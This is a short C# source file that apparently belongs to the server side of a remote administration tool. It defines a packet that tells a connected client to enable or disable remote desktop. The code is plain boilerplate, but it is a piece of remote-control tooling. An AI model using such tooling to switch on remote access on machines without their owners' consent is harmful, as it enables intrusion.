using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using xServer.Core.Networking;

namespace xServer.Core.Packets.ServerPackets
{
    [Serializable]
    public class DoRemoteDesktopProtocol : IPacket
    {
        public bool Enabled { get; set; }
        public DoRemoteDesktopProtocol()
        {

        }

        public DoRemoteDesktopProtocol(bool enabled)
        {
            Enabled = enabled;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
